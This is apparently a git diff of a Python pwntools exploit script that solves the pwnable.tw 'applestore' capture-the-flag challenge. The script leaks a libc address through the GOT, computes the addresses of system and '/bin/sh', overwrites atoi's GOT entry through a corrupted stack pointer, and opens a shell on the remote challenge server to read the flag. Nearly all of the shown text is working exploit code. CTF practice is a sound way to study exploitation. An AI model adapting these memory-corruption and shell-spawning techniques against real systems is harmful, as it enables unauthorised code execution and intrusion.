@@ -5,23 +5,13 @@ from pwn import *
 elf = context.binary = ELF("applestore_patched")
 libc = elf.libc
 
-local = True 
+local = False 
 if local:
     p = process("./applestore_patched")
-    gdb.attach(p,'''
-    b*0x08048a44
-    c
-    ''')
+    gdb.attach(p,'''b*0x08048a44\nc\nc\nc''')
 else:
     p = remote('chall.pwnable.tw', 10104)
-'''
-b*0x08048a44
-    c
-    b*0x08048a44
-    c
-    b*0x08048a03
-    c
-    b*handler+64'''
+
 elf = context.binary = ELF('./applestore_patched', checksec=False)
 
 def add(number):
@@ -51,7 +41,6 @@ for i in range(20):
 checkout()
 
 delete(b"27" + p32(elf.got['puts']))
-
 p.recvuntil(b"Remove 27:")
 libc_base = int.from_bytes(p.recv(4),"little") - 0x5f140
 libc_system = libc_base + 0x3a940
@@ -59,7 +48,7 @@ binsh = libc_base + 0x158e8b
 print("\n[+]Libc_base:    ", hex(libc_base))
 print("[+]Libc_system:  ", hex(libc_base))
 print("[+]Libc_binsh:   ", hex(binsh))
-'''
+
 
 delete(b"27" + p32(libc_base+0x1b1dbc))
 p.recvuntil(b"Remove 27:")
@@ -69,8 +58,12 @@ print("[+]Ebp_addr:     ", hex(ebp_addr))
 atoi_got = 0x804b040
 print("[+]Atoi+0x22:     ", hex(atoi_got+0x22))
 print("[+]Ebp_addr-8:     ", hex(ebp_addr-8))
+
+
 delete(b"27" + p32(0) + p32(0) + p32(atoi_got+0x22) + p32(ebp_addr-8) ) # write atoi_got+0x22 to ebp
-p.sendline(p32(libc_system) + b";sh;")
+
+p.sendline(p32(libc_system) + b";/bin/sh;")
+
 if local:
     p.sendline(b"id")
 else:
@@ -78,5 +71,4 @@ else:
     p.sendline(b"cd home/applestore")
     sleep(1)
     p.sendline(b"cat flag")
-'''
 p.interactive()
